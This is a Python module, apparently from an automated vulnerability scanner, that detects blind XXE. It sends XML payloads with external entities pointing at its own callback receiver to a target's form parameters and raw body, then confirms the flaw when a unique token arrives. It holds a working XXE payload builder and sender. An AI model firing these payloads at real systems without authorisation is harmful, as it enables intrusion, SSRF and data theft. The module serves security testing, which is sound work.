"""
Smart Blind XXE Hunter - OOB(帯域外)ブラインド XXE 検出スペシャリスト (SGK-2026-0494)

in-band XXE（応答にファイル内容が反映される・SGK-2026-0486）と違い、ブラインド XXE は応答に
何も返らない。唯一の手がかりは「XML パーサが外部実体の URL を**外向きに取得**するか」。

確定は OOB で行う：我々の受信器（`OOBProvider`）が一意コールバック URL＋token を発行 →
外部実体 `<!ENTITY x SYSTEM "http://<受信器>/callback/<token>">` を含む XML を標的に送る →
標的のパーサがその URL を取得 → **我々の受信器に一意 token が届く** → ブラインド XXE 確定。
token は乱数で、受信器に届けば「我々の外部実体が実行された」決定的証拠（偶然混入・捏造不可）。

受信器は差し替え可能（`LocalOOBProvider`／将来 interactsh）。エンジンは宛先しか見ない
（[[detection-capability-wiring-map]]）。HTTP OOB が対象（DNS-only は DNS 受信器プロバイダで別途）。
"""
import logging
from typing import Any, Dict, List, Optional, Tuple

from src.core.agents.swarm.base import Specialist, Task
from src.core.models.finding import Finding, VulnType, Severity, Evidence

logger = logging.getLogger(__name__)

_OOB_PLACEHOLDER = "{OOB}"
_XXE_WRAPPER_ELEMENTS: Tuple[str, ...] = ("items", "data", "root", "foo")
_XXE_FALLBACK_PARAMS: Tuple[str, ...] = ("xml", "xxe", "data", "body", "content")
_BLIND_XXE_POLL_TIMEOUT = 12.0


def _build_payload(callback_url: str, element: str = "items", entity: str = "shigokuxxe") -> str:
    """外部実体 SYSTEM=callback_url を含む XML を組み立てる（{OOB} は callback で置換）。"""
    return (
        '<?xml version="1.0"?>\n'
        f'<!DOCTYPE r [<!ENTITY {entity} SYSTEM "{callback_url}">]>\n'
        f"<{element}>&{entity};</{element}>"
    )


def _payload_template(element: str = "items", entity: str = "shigokuxxe") -> str:
    """封印再現用テンプレ（{OOB} を後で fresh callback に置換）。"""
    return _build_payload(_OOB_PLACEHOLDER, element=element, entity=entity)


class SmartBlindXXEHunter(Specialist):
    name = "SmartBlindXXEHunter"
    description = "Blind (OOB) XXE detector via external-entity HTTP callback"
    timeout_seconds = 180
    is_aggressive = False

    def __init__(self, config: Dict = None):
        super().__init__()
        self.config = config or {}

    def _params(self, task: Task) -> Dict[str, Any]:
        return task.params if isinstance(getattr(task, "params", None), dict) else {}

    def _auth_headers(self, task: Task) -> Dict[str, str]:
        params = self._params(task)
        _auth = params.get("_auth", {}) if isinstance(params.get("_auth"), dict) else {}
        headers = dict(_auth.get("auth_headers", {}) or {})
        cookies = str(_auth.get("cookies", "") or params.get("cookies", "") or "")
        if cookies and "Cookie" not in headers:
            headers["Cookie"] = cookies
        return headers

    def _oob_provider(self):
        provider = getattr(self, "_oob", None)
        if provider is not None:
            return provider
        from src.core.detection.oob_provider import LocalOOBProvider
        self._oob = LocalOOBProvider()
        return self._oob

    def _candidate_params(self, task: Task) -> List[str]:
        params = self._params(task)
        provided = params.get("xxe_params") or params.get("xxe_param")
        fields: List[str] = []
        if isinstance(provided, str) and provided.strip():
            fields.append(provided.strip())
        elif isinstance(provided, (list, tuple)):
            fields.extend(str(p) for p in provided)
        for p in _XXE_FALLBACK_PARAMS:
            if p not in fields:
                fields.append(p)
        return fields

    async def execute(self, task: Task, quick_mode: bool = False) -> List[Finding]:
        provider = self._oob_provider()
        started = False
        try:
            await provider.start()
            started = True
        except Exception as exc:  # noqa: BLE001 — receiver boundary, fail closed
            logger.warning("[%s] OOB provider start failed: %s", self.name, exc)
            return []
        try:
            result = await self._probe(task, provider)
        finally:
            if started:
                try:
                    await provider.stop()
                except Exception:  # noqa: BLE001 — best-effort cleanup
                    pass
        if result is None:
            return []
        return [self._build_finding(task.target, result)]

    async def _probe(self, task: Task, provider) -> Optional[Dict[str, Any]]:
        url = task.target
        headers = self._auth_headers(task)
        # モード: (a) form パラメータ (b) 生 XML ボディ。各々で一意 callback を発行し試行。
        for element in ("items", "root"):
            # (a) form parameter mode
            for param in self._candidate_params(task):
                callback_url, token = provider.new_callback()
                payload = _build_payload(callback_url, element=element)
                try:
                    status, _body = await self._send_form(url, {param: payload}, headers)
                except Exception as exc:  # noqa: BLE001 — network boundary
                    logger.debug("[%s] form send failed (%s): %s", self.name, param, exc)
                    continue
                interaction = await provider.poll(token, timeout=_BLIND_XXE_POLL_TIMEOUT)
                if interaction and token in str(interaction.get("path", "")):
                    return self._proof(url, "form", param, element, payload, token,
                                       callback_url, status, interaction, headers)
            # (b) raw XML body mode
            callback_url, token = provider.new_callback()
            payload = _build_payload(callback_url, element=element)
            try:
                status, _body = await self._send_raw(url, payload, headers)
            except Exception as exc:  # noqa: BLE001 — network boundary
                logger.debug("[%s] raw send failed: %s", self.name, exc)
                continue
            interaction = await provider.poll(token, timeout=_BLIND_XXE_POLL_TIMEOUT)
            if interaction and token in str(interaction.get("path", "")):
                return self._proof(url, "raw", "__raw__", element, payload, token,
                                   callback_url, status, interaction, headers)
        return None

    def _proof(self, url, mode, param, element, payload, token, callback_url,
               status, interaction, headers) -> Dict[str, Any]:
        return {
            "request_url": url, "mode": mode, "param": param, "element": element,
            "payload": payload, "token": token, "callback_url": callback_url,
            "request_status": status, "interaction": interaction,
            "auth_headers": headers,
        }

    async def _send_form(self, url, data: Dict[str, str], headers) -> Tuple[int, str]:
        return await self._send(url, data=data, headers=headers, content_type=None)

    async def _send_raw(self, url, payload: str, headers) -> Tuple[int, str]:
        return await self._send(url, data=payload, headers=headers,
                                content_type="application/xml")

    async def _send(self, url, *, data, headers, content_type) -> Tuple[int, str]:
        h = dict(headers or {})
        if content_type:
            h["Content-Type"] = content_type

        async def _do(client):
            return await client.request("POST", url, data=data, headers=h, use_proxy=True)

        injected = getattr(self, "_client", None)
        if injected is not None:
            resp = await _do(injected)
        else:
            from src.core.infra.network_client import AsyncNetworkClient
            async with AsyncNetworkClient() as client:
                resp = await _do(client)
        st = int(getattr(resp, "status", 0) or 0)
        rbody = getattr(resp, "body", None)
        if rbody is None:
            rbody = getattr(resp, "text", "") or ""
        if isinstance(rbody, bytes):
            rbody = rbody.decode("utf-8", errors="replace")
        return st, str(rbody)

    def _build_finding(self, target_url: str, proof: Dict[str, Any]) -> Finding:
        url = proof["request_url"]
        mode = proof["mode"]
        param = proof["param"]
        element = proof["element"]
        payload = proof["payload"]
        token = proof["token"]
        callback_url = proof["callback_url"]
        interaction = proof["interaction"]
        status = proof["request_status"]
        remote_ip = str(interaction.get("remote_ip", ""))

        body_line = (
            f"Content-Type: application/xml\r\n\r\n{payload}"
            if mode == "raw"
            else f"Content-Type: application/x-www-form-urlencoded\r\n\r\n{param}={payload}"
        )
        poc_request = (
            f"POST {url} HTTP/1.1\r\n"
            f"{body_line}\r\n"
            f"# ^ Blind XXE ({mode} mode): the external entity points at our OOB receiver."
        )
        cb_method = str(interaction.get("method") or "GET")
        cb_path = str(interaction.get("path") or "")
        cb_ts = interaction.get("timestamp")
        cb_headers = interaction.get("headers") if isinstance(interaction.get("headers"), dict) else {}
        cb_host = str(cb_headers.get("Host") or cb_headers.get("host") or "")
        cb_ua = str(cb_headers.get("User-Agent") or cb_headers.get("user-agent") or "")
        poc_response = (
            f"HTTP/1.1 {status}\r\n"
            "\r\n"
            "(in-band response is blind: no reflection/error revealing the entity)\r\n"
            "\r\n"
            "===== RAW OUT-OF-BAND REQUEST OBSERVED AT OUR OOB RECEIVER =====\r\n"
            "The target itself made this inbound HTTP request to our server:\r\n"
            f"{cb_method} {cb_path} HTTP/1.1\r\n"
            + (f"Host: {cb_host}\r\n" if cb_host else "")
            + (f"User-Agent: {cb_ua}\r\n" if cb_ua else "")
            + f"(source IP: {remote_ip}, received_at: {cb_ts})\r\n"
            "\r\n"
            f"CORRELATION: the random token '{token}' appears in the path above AND was placed "
            "by us ONLY inside the external-entity SYSTEM URL of the XML in the request "
            "(poc_request). There is no in-band channel that could deliver this token to our "
            "server; the only cause is the target's XML parser resolving our external entity. "
            "=> blind (out-of-band) XXE confirmed."
        )
        impact = (
            f"標的の XML パーサが外部実体 `SYSTEM \"{callback_url}\"` を**外向きに取得**した。"
            f"応答は in-band では何も返さない（HTTP {status}・ブラインド）が、我々の受信器に一意 token "
            f"'{token}' のコールバックが標的（{remote_ip}）から届いた。token は我々が送った外部実体 URL に"
            "しか存在しないため、これは XML パーサが外部実体を解決した決定的証拠。ブラインド XXE は"
            "内部 SSRF・ローカルファイル/メタデータの OOB 抜き出し等に直結する実害。"
        )
        return Finding(
            target_url=target_url,
            vuln_type=VulnType.XXE,
            severity=Severity.HIGH,
            title="Blind (OOB) XXE via external-entity HTTP callback",
            description=(
                "Blind XXE confirmed out-of-band: an external entity pointing at our OOB receiver "
                f"caused the target's XML parser to fetch it, delivering the unique token '{token}' "
                f"to our receiver from the target ({remote_ip}). No in-band reflection (HTTP {status})."
            ),
            source_agent=self.name,
            confidence=0.95,
            impact=impact,
            reproduction_steps=[
                "OOB 受信器で一意コールバック URL＋token を発行する。",
                f"外部実体 `SYSTEM \"<callback>\"` を含む XML を {url} に送る（{mode} モード）。",
                "受信器に token 付きのコールバックが標的から届くことを確認する（＝ブラインド XXE）。",
            ],
            tags=["xxe", "blind", "oob", "high", "oob_interaction_received"],
            evidence=Evidence(
                request_method="POST",
                request_url=url,
                request_headers={**proof.get("auth_headers", {})},
                request_body=payload,
                response_status=status,
                response_headers={},
                response_body="",  # blind: no in-band body
            ),
            additional_info={
                "oob_evidence": {
                    "vuln_class": "xxe",
                    "channel": "http",
                    "token": token,
                    "callback_url": callback_url,
                    "payload": payload,
                    "interaction_received": True,
                    "interaction": interaction,
                    "request_status": status,
                },
                "oob_replay": {
                    "method": "POST",
                    "url": url,
                    "mode": mode,
                    "param": param,
                    "content_type": "application/xml" if mode == "raw" else None,
                    "payload_template": _payload_template(element=element),
                },
                # impact ゲートを満たす VDP マーカー（OOB コールバック受領）。
                "unique_oob_callback_received": True,
                "poc_request": poc_request,
                "poc_response": poc_response,
            },
        )
